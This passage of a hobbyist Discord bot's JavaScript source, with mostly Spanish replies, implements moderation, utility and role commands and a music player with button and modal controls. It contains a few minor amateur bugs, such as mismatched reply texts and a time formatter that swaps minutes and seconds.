        // Check if bot has permission to ban members (which includes unbanning)
        if (!message.guild.members.me.permissions.has(PermissionFlagsBits.BanMembers)) {
            return message.channel.send('I don\'t have permission to unban members.');
        }

        try {
            await message.guild.members.unban(userId);
            message.channel.send(`Ejemplo !unkick <1348944055605661767> o !unkick <@${userId}>`);
        } catch (error) {
            console.error('Error unbanning user:', error);
            message.channel.send('Fallo al quitar el muteo.');
        }
    }
    
    if (command === "uptime") {
        const uptime = process.uptime();
        const dias = Math.floor(uptime / 86400);
        const horas = Math.floor(uptime / 3600) % 24;
        const minutos = Math.floor(uptime / 60) % 60;
        message.reply(`Tiempo activo: ${dias}d ${horas}h ${minutos}m`);
    }
    
    if (command === "infobot") {
        message.channel.send(`Nombre bot: ${client.user.tag}\nBot ID: ${client.user.id}\nTotal Servidores: ${client.guilds.cache.size}`);
    }
    
    if (command === "botinfo") {
        const embed = new EmbedBuilder()
            .setTitle('Informationcion')
            .addFields(
                { name: 'Servidores', value: client.guilds.cache.size.toString(), inline: true },
                { name: 'Usuarios', value: client.users.cache.size.toString(), inline: true },
                { name: 'Canales', value: client.channels.cache.size.toString(), inline: true },
                { name: 'Discord.js', value: '14.x', inline: true }
            )
            .setColor('#0099ff');
        message.reply({ embeds: [embed] });
    }
    
    if (command === "ppt") {
        const choices = ['piedra', 'papel', 'tijeras'];
        const choice = args[0]?.toLowerCase();
        if (!choices.includes(choice)) return message.reply("Selecciona papel piedra o tijeras!");
        const botChoice = choices[Math.floor(Math.random() * choices.length)];
        message.reply(`Tu acción ${choice}, acción del bot ${botChoice}`);
    }
    
    if (command === "members") {
        const online = message.guild.members.cache.filter(m => m.presence?.status === 'online').size;
        const total = message.guild.memberCount;
        message.reply(`Miembros en linea: ${online}\nMiembros en total: ${total}`);
    }
    
    if (command === "poll") {
        if (args.length < 1) {
            return message.channel.send('Da una pregunta para hacer la acción. ');
        }

        const question = args.join(' ');
        const embed = new EmbedBuilder()
            .setTitle('📊 Encuesta')
            .setDescription(question)
            .setColor('#0099ff')
            .setFooter({ text: `Encuesta creada por ${message.author.tag}` });

        const pollMessage = await message.channel.send({ embeds: [embed] });
        await pollMessage.react('👍');
        await pollMessage.react('👎');
        await pollMessage.react('🤷');
    }
    
    if (command === "createchannel") {
        if (!message.member.permissions.has(PermissionFlagsBits.ManageChannels)) return message.reply("Tu no tienes los permisos para usar este comando!");
        const channelName = args.join('-').toLowerCase();
        if (!channelName) return message.reply("Especifica el nombre del canal!");
        message.guild.channels.create({ name: channelName })
            .then(channel => message.reply(`Canal creado ${channel}`))
            .catch(err => message.reply("Fallo al crear el canal"));
    }
    
    if (command === "delchannel") {
        if (!message.member.permissions.has(PermissionFlagsBits.ManageChannels)) return message.reply("Tu no tienes los permisos para usra este comando!");
        const channel = message.mentions.channels.first() || message.channel;
        channel.delete().then(() => message.author.send(`Canal eliminado ${channel.name}`))
            .catch(err => message.reply("Fallo al eliminar el canal"));
    }
    
    if (command === "createrole") {
        if (!message.member.permissions.has(PermissionFlagsBits.ManageRoles)) return message.reply("No tienes los permisos para usar este comando!");
        const roleName = args.join(' ');
        if (!roleName) return message.reply("Especifica cual es el nombre de este roll!");
        message.guild.roles.create({ name: roleName })
            .then(role => message.reply(`Roll creado ${role.name}`))
            .catch(err => message.reply("Fallo al crear el roll"));
    }
    
    if (command === "delrole") {
        if (!message.member.permissions.has(PermissionFlagsBits.ManageRoles)) return message.reply("Tu no tienes permisos para usar este comando!");
        const role = message.mentions.roles.first();
        if (!role) return message.reply("Mensiona el roll a eliminar!");
        role.delete()
            .then(() => message.reply(`Roll eliminado ${role.name}`))
            .catch(err => message.reply("Fallo al eliminar este roll"));
    }
    
    if (command === "giverole") {
        if (!message.member.permissions.has(PermissionFlagsBits.ManageRoles)) return message.reply("Tu no tienes permisos para usar este comando!");
        const member = message.mentions.members.first();
        const role = message.mentions.roles.first();
        if (!member || !role) return message.reply("Mensiona a un miembro para ver su roll!");
        member.roles.add(role)
            .then(() => message.reply(`Revision de roll ${role} de ${member}`))
            .catch(err => message.reply("Fallo al ver el roll"));
    }
    
     if (command === "removerole") {
        if (!message.member.permissions.has(PermissionFlagsBits.ManageRoles)) return message.reply("No tienes permisos para usar este comando!");
        const member = message.mentions.members.first();
        const role = message.mentions.roles.first();
        if (!member || !role) return message.reply("Mensiona a un miembro para quitar su roll!");
        member.roles.remove(role)
            .then(() => message.reply(`Roll ${role} eliminado de ${member}`))
            .catch(err => message.reply("Failed to remove role"));
    }
  
      if (command === 'player') {
        if (currentPlayerMessage) {
            await currentPlayerMessage.delete();
        }

        await updateMusicPanel(message.channel);
    }
    

    if (command === 'play') {
        const voiceChannel = message.member.voice.channel;
        if (!voiceChannel) return message.reply('❌ Debes estar en un canal de voz.');
    
        const query = args.join(' ');
        if (!query) return message.reply('❌ Debes especificar una canción.');
    
        try {
            let queue = player.nodes.get(message.guild.id);
    
            if (!queue) {
                queue = player.nodes.create(message.guild.id, {
                    metadata: { channel: message.channel },
                    selfDeaf: true,
                    volume: 100,
                    leaveOnEmpty: true,
                    leaveOnEmptyCooldown: 10000,
                    leaveOnEnd: false,
                    leaveOnEndCooldown: 10000,
                });
            }
    
            const { track } = await player.play(voiceChannel, query, {
                nodeOptions: queue,
            });
    
            message.reply(`🎶 **${track.title}** ha sido agregada a la cola.`);
        } catch (error) {
            console.error('❌ Error al intentar reproducir:', error);
            message.reply('❌ Ocurrió un error al intentar reproducir la canción.');
        }
    }

    if (command === 'stop') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || !queue.isPlaying()) return message.reply('❌ No hay música en reproducción.');
        queue.delete();
        message.reply('⏹ Música detenida.');
    }

    if (command === 'skip') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || !queue.isPlaying()) return message.reply('❌ No hay música en reproducción.');
        queue.node.skip();
        message.reply('⏭ Canción saltada.');
    }

    if (command === 'pause') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || !queue.isPlaying()) return message.reply('❌ No hay música en reproducción.');
        queue.node.setPaused(true);
        message.reply('⏸ Música pausada.');
    }

    if (command === 'resume') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || !queue.isPlaying()) return message.reply('❌ No hay música pausada.');
        queue.node.setPaused(false);
        message.reply('▶ Música reanudada.');
    }

    if (command === 'volume') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || !queue.isPlaying()) return message.reply('❌ No hay música en reproducción.');
        const volume = parseInt(args[0]);
        if (isNaN(volume) || volume < 0 || volume > 100) return message.reply('❌ Especifica un volumen entre 0 y 100.');
        queue.node.setVolume(volume);
        message.reply(`🔊 Volumen ajustado a **${volume}%**`);
    }

    if (command === 'list') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || queue.tracks.size === 0) return message.reply('❌ La lista de reproducción está vacía.');
    
        const tracks = queue.tracks.map((track, index) => `\`${index + 1}.\` **${track.title}** - ${track.author}`).join('\n');
    
        message.reply(`🎵 **Lista de reproducción:**\n${tracks}`);
    }

    if (command === 'info') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || !queue.isPlaying()) return message.reply('❌ No hay música en reproducción.');
        
        const currentTrack = queue.currentTrack;
        const tracks = queue.tracks.toArray(); 
        const nextTrack = tracks[0]; 
    
        const volume = queue.node.volume;
    
        const response = `🎵 **Información de reproducción**\n` +
            `▶ **Reproduciendo:** ${currentTrack.title} - ${currentTrack.author}\n` +
            (nextTrack ? `⏭ **Siguiente:** ${nextTrack.title} - ${nextTrack.author}\n` : '⏭ **Siguiente:** No hay más canciones en la cola.\n') +
            `🔊 **Volumen:** ${volume}%`;
        
        message.reply(response);
    } 

    if (command === 'time') {
        const queue = player.nodes.get(message.guild.id);
        if (!queue || !queue.isPlaying()) return message.reply('❌ No hay música en reproducción.');
    
        const currentTrack = queue.currentTrack;
        const elapsedTime = queue.node.position; 
        const totalDuration = currentTrack.durationMS; 
        const remainingTime = totalDuration - elapsedTime;
    
        if (remainingTime <= 0) {
            return message.reply('⏳ La canción está por terminar.');
        }
    
        const formatTime = (ms) => {
            const tims = Math.floor((ms / 1000) % 60);
            const tims2 = Math.floor((ms / 1000 / 60) % 60);
            return `${tims}:${tims2.toString().padStart(2, '0')}`;
        };
    
        message.reply(`⏳ **Tiempo restante:** ${formatTime(remainingTime)}`);
    }
});

player.events.on('playerStart', async (queue, track) => {
    await updateMusicPanel(queue.metadata.channel);
});

player.events.on('trackAdd', async (queue) => {
    await updateMusicPanel(queue.metadata.channel);
});

player.events.on('trackEnd', async (queue) => {
    await updateMusicPanel(queue.metadata.channel);
});

async function updateMusicPanel(channel) {
    const queue = player.nodes.get(channel.guild.id);
    if (!queue || !queue.isPlaying()) {
        return channel.send({ content: '❌ No hay música en reproducción.', embeds: [], components: [] });
    }

    const currentTrack = queue.currentTrack;
    const nextTrack = queue.tracks.toArray()[0];

    const embed = new EmbedBuilder()
        .setColor(0x1DB954)
        .setTitle('🎵 Reproduciendo ahora')
        .setDescription(`▶ **${currentTrack.title}**\n🎤 ${currentTrack.author}`)
        .setThumbnail(currentTrack.thumbnail)
        .addFields(
            { name: '⏭ Siguiente canción', value: nextTrack ? `🎵 **${nextTrack.title}**` : '🚫 No hay más canciones en la cola.', inline: false }
        );

    const row = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder().setCustomId('pause').setLabel('⏸ Pausar').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('resume').setLabel('▶ Reanudar').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId('skip').setLabel('⏭ Saltar').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('stop').setLabel('⏹ Detener').setStyle(ButtonStyle.Danger)
        );

    const row2 = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder().setCustomId('search').setLabel('🔎 Agregar canción').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('lista').setLabel('📋 Lista de canciones').setStyle(ButtonStyle.Secondary)
        );

    const message = await channel.send({ embeds: [embed], components: [row, row2] });
    currentPlayerMessage = message;
}

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton() && !interaction.isModalSubmit()) return;

    const queue = player.nodes.get(interaction.guild.id);

    if (interaction.customId === 'pause') {
        if (!queue || !queue.isPlaying()) return interaction.reply({ content: '❌ No hay música en reproducción.', ephemeral: true });
        queue.node.setPaused(true);
        await interaction.reply({ content: '⏸ Música pausada.', ephemeral: true });
    }

    if (interaction.customId === 'resume') {
        if (!queue || !queue.isPlaying()) return interaction.reply({ content: '❌ No hay música en reproducción.', ephemeral: true });
        queue.node.setPaused(false);
        await interaction.reply({ content: '▶ Música reanudada.', ephemeral: true });
    }

    if (interaction.customId === 'skip') {
        if (!queue || !queue.isPlaying()) return interaction.reply({ content: '❌ No hay música en reproducción.', ephemeral: true });
        queue.node.skip();
        await interaction.reply({ content: '⏭ Canción saltada.', ephemeral: true });
        if (currentPlayerMessage) {
            await currentPlayerMessage.delete();
        }
    }

    if (interaction.customId === 'stop') {
        if (!queue || !queue.isPlaying()) return interaction.reply({ content: '❌ No hay música en reproducción.', ephemeral: true });
        queue.delete();
        await interaction.reply({ content: '⏹ Música detenida.', ephemeral: true });
    }

    if (interaction.customId === 'search') {
        const modal = new ModalBuilder()
            .setCustomId('search_modal')
            .setTitle('🔎 Buscar Canción');

        const songInput = new TextInputBuilder()
            .setCustomId('song_name')
            .setLabel('Nombre de la canción')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        const actionRow = new ActionRowBuilder().addComponents(songInput);
        modal.addComponents(actionRow);

        await interaction.showModal(modal);
    }

    if (interaction.customId === 'search_modal') {
        await interaction.deferReply({ ephemeral: true });
        const songName = interaction.fields.getTextInputValue('song_name');
        
        const voiceChannel = interaction.member.voice.channel;
        if (!voiceChannel) return interaction.followUp({ content: '❌ Debes estar en un canal de voz.', ephemeral: true });

        try {
            let queue = player.nodes.get(interaction.guild.id);
            if (!queue) {
                queue = player.nodes.create(interaction.guild.id, {
                    metadata: { channel: interaction.channel },
                    selfDeaf: true,
                    volume: 20,
                    leaveOnEmpty: true,
                    leaveOnEmptyCooldown: 10000,
                    leaveOnEnd: false,
                    leaveOnEndCooldown: 10000,
                });
            }

            const { track } = await player.play(voiceChannel, songName, { nodeOptions: queue });
            
            await interaction.followUp({ content: `🎶 **${track.title}** ha sido agregada a la cola.`, ephemeral: true });
            if (currentPlayerMessage) {
                await currentPlayerMessage.delete();
            }
            await updateMusicPanel(interaction.channel);
        } catch (error) {
            console.error('❌ Error al intentar reproducir:', error);
            interaction.followUp({ content: '❌ Ocurrió un error al intentar reproducir la canción.', ephemeral: true });
        }
    }

    if (interaction.customId === 'lista') {
        const tracks = queue.tracks.toArray();
        const list = tracks.map((track, index) => `\`${index + 1}\`. ${track.title}`).join('\n');
        await interaction.reply({ content: list || '❌ No hay canciones en la cola.', ephemeral: true });
    }
});

// Telling us that its online
client.once("ready", () => {
  console.log("Bot is online!");
});

// Put in your bot token (Don't share it with anyone)
client.login(token);
